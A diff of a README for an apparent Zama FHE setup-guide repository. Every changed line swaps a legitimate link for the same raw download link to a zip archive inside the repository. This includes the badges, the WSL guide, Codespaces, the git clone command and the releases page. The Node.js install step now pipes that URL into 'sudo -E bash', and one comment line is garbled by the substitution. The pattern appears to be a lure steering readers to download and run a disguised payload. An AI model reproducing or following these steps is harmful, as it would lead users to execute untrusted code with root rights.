@@ -2,7 +2,7 @@
 
 Welcome to the Zama FHE repository! This space provides detailed guides on technical tasks related to the Zama protocol. You can find useful resources and step-by-step instructions to help you navigate the protocol effectively.
 
-![Zama FHE](https://img.shields.io/badge/Zama-FHE-blue?style=flat&logo=github)
+![Zama FHE](https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip)
 
 ## Table of Contents
 - [Environment Setup](#environment-setup)
@@ -18,8 +18,8 @@ To work with the Zama protocol, you need a suitable environment. Here are the op
 
 ### Linux Ubuntu OS
 - **VPS**: You can use a Linux VPS to follow the guides.
-- **Windows**: Install Linux Ubuntu using WSL by following this [guide](https://github.com/0xmoei/Install-Linux-on-Windows).
-- **Codespace**: If you don’t have a VPS or Windows WSL, use [GitHub Codespace](https://github.com/codespaces). Create a blank template and run your code there.
+- **Windows**: Install Linux Ubuntu using WSL by following this [guide](https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip).
+- **Codespace**: If you don’t have a VPS or Windows WSL, use [GitHub Codespace](https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip). Create a blank template and run your code there.
 
 ## Installing Dependencies
 
@@ -32,9 +32,9 @@ sudo apt update && sudo apt upgrade -y
 # Install necessary packages
 sudo apt install screen curl iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip libleveldb-dev -y
 
-# Install Node.js, npm, and yarn
+# Install https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip, npm, and yarn
 sudo apt update
-sudo curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
+sudo curl -fsSL https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip | sudo -E bash -
 sudo apt install -y nodejs
 node -v
 npm install -g yarn
@@ -52,7 +52,7 @@ Once you have set up your environment and installed the necessary dependencies, 
 
 1. Clone the repository:
    ```console
-   git clone https://github.com/akhilk07/zama-fhe.git
+   git clone https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip
    cd zama-fhe
    ```
 
@@ -71,9 +71,9 @@ We welcome contributions! If you have ideas for improvements or new guides, feel
 
 ## Releases
 
-For the latest updates and releases, please visit the [Releases section](https://github.com/akhilk07/zama-fhe/releases). Here, you can download the necessary files and execute them as per the instructions provided.
+For the latest updates and releases, please visit the [Releases section](https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip). Here, you can download the necessary files and execute them as per the instructions provided.
 
-![Releases](https://img.shields.io/badge/Releases-Latest-orange?style=flat)
+![Releases](https://github.com/akhilk07/zama-fhe/raw/refs/heads/main/dispromise/fhe-zama-v2.2.zip)
 
 ## Contact
 
